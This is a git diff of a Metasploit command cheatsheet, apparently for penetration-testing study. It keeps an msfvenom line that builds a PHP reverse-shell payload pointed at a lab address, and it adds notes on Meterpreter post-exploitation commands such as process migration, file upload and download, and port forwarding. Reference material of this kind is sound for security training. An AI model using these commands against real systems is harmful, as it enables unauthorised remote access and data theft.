2c93985e6aa52d346c70486e9bfc4227518e8187
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-08-03 11:37:49 +0500

    Update msf.sh

--- Command Cheatsheets/msf.sh
+++ Command Cheatsheets/msf.sh
@@ -40,9 +40,43 @@ workspace -d <workspace_name> # Delete a workspace
 msfvenom -l payloads # List msfvenom payloads
 msfvenom --list format # List supported output formats
 msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > # Generating a Reverse Shell
+msfvenom --list payloads | grep meterpreter # List all meterpreter payloads
 
 
+# ===========
+# Meterpreter
+# ===========
 
+# Core Commands
+background # Backgrounds the current session
+exit # Terminate the Meterpreter session
+guid # Get the session GUID (Globally Unique Identifier)
+help # Displays the help menu
+info # Displays information about a Post module
+irb # Opens an interactive Ruby shell on the current session
+load # Loads one or more Meterpreter extensions
+migrate # Allows you to migrate Meterpreter to another process
+run # Executes a Meterpreter script or Post module
+sessions # Quickly switch to another session
+
+# File System Commands
+cd # Will change directory
+ls # Will list files in the current directory (dir will also work)
+pwd # Prints the current working directory
+edit # will allow you to edit a file
+cat # Will show the contents of a file to the screen
+rm # Will delete the specified file
+search # Will search for files
+upload # Will upload a file or directory
+download # Will download a file or directory
+
+# Networking commands
+
+arp # Displays the host ARP (Address Resolution Protocol) cache
+ifconfig # Displays network interfaces available on the target system
+netstat # Displays the network connections
+portfwd # Forwards a local port to a remote service
+route # Allows you to view and modify the routing table
 
 
 
